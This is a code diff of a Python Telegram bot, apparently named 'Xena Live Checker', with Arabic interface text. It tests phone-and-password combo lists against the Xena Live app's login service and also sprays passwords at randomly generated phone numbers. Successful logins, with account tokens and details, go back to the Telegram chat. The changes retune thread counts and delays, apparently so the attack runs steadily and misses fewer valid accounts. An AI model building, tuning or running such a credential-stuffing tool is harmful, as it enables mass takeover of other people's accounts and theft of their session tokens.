@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════╗
-# ║    📱  Xena Live — Telegram Bot Checker v2.7            ║
+# ║    📱  Xena Live — Telegram Bot Checker v2.8            ║
+# ║    ⚡  (نظام السرعة المتوازنة والمستقرة - Balanced Mode)   ║
 # ╚══════════════════════════════════════════════════════════╝
 
 import os
@@ -10,6 +11,7 @@ import random
 import hashlib
 import struct
 import threading
+import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
@@ -161,7 +163,7 @@ def _make_meta(did):
     ]
 
 # ══════════════════════════════════════════════════════════
-#  gRPC Client (أصلي تماماً ودون مساس)
+#  gRPC Client
 # ══════════════════════════════════════════════════════════
 
 class GrpcClient:
@@ -327,7 +329,7 @@ def detect_country_and_format(phone_input):
 # ══════════════════════════════════════════════════════════
 
 user_states = {}
-stop_events = {}  # متغيرات إيقاف الفحص النشط لكل مستخدم
+stop_events = {}
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -336,9 +338,9 @@ def send_welcome(message):
     markup.add(
         InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check"),
         InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_check"),
-        InlineKeyboardButton("⚡ فحص تلقائي عشوائي (فائق السرعة - لا نهائي)", callback_data="auto_check")
+        InlineKeyboardButton("⚖️ فحص تلقائي عشوائي (سرعة متوازنة مستقرة)", callback_data="auto_check")
     )
-    bot.reply_to(message, "أهلاً بك في بوت فحص حسابات Xena Live.\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)
+    bot.reply_to(message, "أهلاً بك في بوت فحص حسابات Xena Live (الإصدار المتوازن).\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -348,7 +350,7 @@ def callback_query(call):
         target_chat_id = int(call.data.split("_")[2])
         if target_chat_id in stop_events:
             stop_events[target_chat_id].set()
-            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص الفائق...")
+            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص بأمان...")
         else:
             bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط حالياً.")
         return
@@ -363,8 +365,8 @@ def callback_query(call):
         stop_event = threading.Event()
         stop_events[chat_id] = stop_event
         
-        bot.send_message(chat_id, "⚡ جارِ بدء الفحص التلقائي العشوائي (فائق السرعة - تعدد المسارات)...")
-        threading.Thread(target=run_fast_auto_checker, args=(chat_id, stop_event), daemon=True).start()
+        bot.send_message(chat_id, "⚖️ جارِ بدء الفحص التلقائي بالسرعة المتوازنة المستقرة...")
+        threading.Thread(target=run_balanced_auto_checker, args=(chat_id, stop_event), daemon=True).start()
 
 @bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id] == "waiting_single")
 def process_single(message):
@@ -436,7 +438,7 @@ def run_combo_checker(chat_id, file_path, stop_event):
 
         status_msg = bot.send_message(
             chat_id, 
-            f"🔄 **بدء فحص الكومبو التلقائي...**\n"
+            f"🔄 **بدء فحص الكومبو (وضع متوازن)...**\n"
             f"📊 المجموع الكلي: `{total}`\n"
             f"⏳ تم فحص: `0 / {total}`\n"
             f"🎯 عدد الـ Hits: `0`", 
@@ -447,7 +449,7 @@ def run_combo_checker(chat_id, file_path, stop_event):
         last_update = 0
         for idx, line in enumerate(lines, 1):
             if stop_event.is_set():
-                bot.send_message(chat_id, f"🛑 **تم إيقاف فحص الكومبو بناءً على طلبك!**\n📊 تم فحص: `{idx-1} / {total}`\n🎯 الـ Hits المكتشفة: `{hits_count}`", parse_mode="Markdown")
+                bot.send_message(chat_id, f"🛑 **تم إيقاف فحص الكومبو!**\n📊 تم فحص: `{idx-1} / {total}`\n🎯 الـ Hits المكتشفة: `{hits_count}`", parse_mode="Markdown")
                 break
 
             if ":" in line:
@@ -474,12 +476,15 @@ def run_combo_checker(chat_id, file_path, stop_event):
                     hit_found = True
                     break
             
+            # فاصل زمني بسيط ومدروس لمنع الضغط والتعليق
+            time.sleep(0.12)
+
             if idx - last_update >= 5 or idx == total:
                 try:
                     bot.edit_message_text(
                         chat_id=chat_id,
                         message_id=status_msg.message_id,
-                        text=f"🔄 **جارِ فحص الكومبو تلقائياً...**\n"
+                        text=f"🔄 **جارِ فحص الكومبو (وضع متوازن)...**\n"
                              f"📊 المجموع الكلي: `{total}`\n"
                              f"⏳ تم فحص: `{idx} / {total}`\n"
                              f"🎯 عدد الـ Hits: `{hits_count}`",
@@ -489,14 +494,13 @@ def run_combo_checker(chat_id, file_path, stop_event):
                     last_update = idx
                 except:
                     pass
-                time.sleep(0.1)
         
         if not stop_event.is_set():
             try:
                 bot.edit_message_text(
                     chat_id=chat_id,
                     message_id=status_msg.message_id,
-                    text=f"🏁 **انتهى فحص الكومبو بالكامل!**\n📊 إجمالي السطور المفحوصة: `{total}`\n🎯 الـ Hits الناجحة الإجمالية: `{hits_count}`",
+                    text=f"🏁 **انتهى فحص الكومبو بنجاح!**\n📊 إجمالي السطور: `{total}`\n🎯 إجمالي الـ Hits: `{hits_count}`",
                     parse_mode="Markdown"
                 )
             except:
@@ -509,7 +513,7 @@ def run_combo_checker(chat_id, file_path, stop_event):
         if os.path.exists(file_path):
             os.remove(file_path)
 
-def run_fast_auto_checker(chat_id, stop_event):
+def run_balanced_auto_checker(chat_id, stop_event):
     scanned_count = [0]
     hits_count = [0]
     errors_count = [0]
@@ -518,13 +522,13 @@ def run_fast_auto_checker(chat_id, stop_event):
     countries = list(COUNTRY_MAP.keys())
     
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص السريع", callback_data=f"stop_auto_{chat_id}"))
+    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص المتوازن", callback_data=f"stop_auto_{chat_id}"))
     
     status_msg = bot.send_message(
         chat_id,
-        f"⚡ **بدء الفحص التلقائي فائق السرعة (جميع الدول - لا نهائي)...**\n"
-        f"🚀 الحالة: `يعمل بتعدد المسارات (Multi-threaded)`\n"
-        f"⏳ إجمالي الأرقام المفحوصة: `0`\n"
+        f"⚖️ **بدء الفحص التلقائي (السرعة المتوازنة والمستقرة)...**\n"
+        f"🚀 الحالة: `مستقر وآمن (Balanced Threads)`\n"
+        f"⏳ الأرقام المفحوصة: `0`\n"
         f"🎯 الـ Hits: `0` | ⚠️ الأخطاء: `0`",
         parse_mode="Markdown",
         reply_markup=markup
@@ -562,7 +566,7 @@ def run_fast_auto_checker(chat_id, stop_event):
                     with stats_lock:
                         hits_count[0] += 1
                     acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
-                    msg = format_hit_msg(phone, pw, r, acct, via=f"FAST_{cc}_" + ("SPRAY" if idx > 0 else "DIR"))
+                    msg = format_hit_msg(phone, pw, r, acct, via=f"BAL_{cc}_" + ("SPRAY" if idx > 0 else "DIR"))
                     bot.send_message(chat_id, msg, parse_mode="Markdown")
                     break
         except Exception:
@@ -570,21 +574,21 @@ def run_fast_auto_checker(chat_id, stop_event):
                 errors_count[0] += 1
         finally:
             cli.close()
+            # مهساوية بسيطة جداً لكل خيط لضبط السرعة المثالية (لا سريع مفرط ولا بطيء)
+            time.sleep(0.15)
 
-    # استخدام ThreadPoolExecutor لتشغيل عدة عمليات فحص في نفس الوقت وبسرعة فائقة
-    with ThreadPoolExecutor(max_workers=6) as executor:
+    # عدد المسارات المتوازنة والمثالية (4 مسارات لضمان الاستقرار التام وعدم ضياع أي حساب صحيح)
+    with ThreadPoolExecutor(max_workers=4) as executor:
         last_edit_time = time.time()
         while not stop_event.is_set():
-            # إرسال مهام فحص جديدة للمسارات
-            futures = [executor.submit(worker_task) for _ in range(3)]
+            futures = [executor.submit(worker_task) for _ in range(2)]
             
-            # انتظار إكمال الدفعة الحالية
             for f in concurrent.futures.as_completed(futures):
                 if stop_event.is_set():
                     break
             
-            # تحديث شاشة الحالة بانتظام (كل ثانية تقريباً لضمان السلاسة وعدم حظر التيليجرام)
-            if time.time() - last_edit_time >= 1.0:
+            # تحديث الشاشة بانتظام دون إحداث ضغط على التيليجرام
+            if time.time() - last_edit_time >= 1.2:
                 with stats_lock:
                     s_cnt = scanned_count[0]
                     h_cnt = hits_count[0]
@@ -593,9 +597,9 @@ def run_fast_auto_checker(chat_id, stop_event):
                     bot.edit_message_text(
                         chat_id=chat_id,
                         message_id=status_msg.message_id,
-                        text=f"⚡ **جارِ الفحص التلقائي فائق السرعة (جميع الدول)...**\n"
-                             f"🚀 الحالة: `نشط وفعّال (أداء عالي)`\n"
-                             f"⏳ إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
+                        text=f"⚖️ **جارِ الفحص التلقائي (السرعة المتوازنة المستقرة)...**\n"
+                             f"🚀 الحالة: `يعمل بسلاسة وثبات تام`\n"
+                             f"⏳ الأرقام المفحوصة: `{s_cnt}`\n"
                              f"🎯 الـ Hits: `{h_cnt}` | ⚠️ الأخطاء: `{e_cnt}`",
                         parse_mode="Markdown",
                         reply_markup=markup
@@ -604,7 +608,7 @@ def run_fast_auto_checker(chat_id, stop_event):
                     pass
                 last_edit_time = time.time()
             
-            time.sleep(0.05)
+            time.sleep(0.1)
 
     if stop_event.is_set():
         with stats_lock:
@@ -614,7 +618,7 @@ def run_fast_auto_checker(chat_id, stop_event):
         try:
             bot.send_message(
                 chat_id, 
-                f"🛑 **تم إيقاف الفحص فائق السرعة بناءً على طلبك!**\n"
+                f"🛑 **تم إيقاف الفحص المتوازن بناءً على طلبك!**\n"
                 f"📊 إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
                 f"🎯 إجمالي الـ Hits: `{h_cnt}` | ⚠️ إجمالي الأخطاء: `{e_cnt}`", 
                 parse_mode="Markdown"
@@ -625,5 +629,5 @@ def run_fast_auto_checker(chat_id, stop_event):
     stop_events.pop(chat_id, None)
 
 if __name__ == "__main__":
-    print("🤖 Bot is running...")
+    print("🤖 Bot (Balanced Version v2.8) is running...")
     bot.infinity_polling()
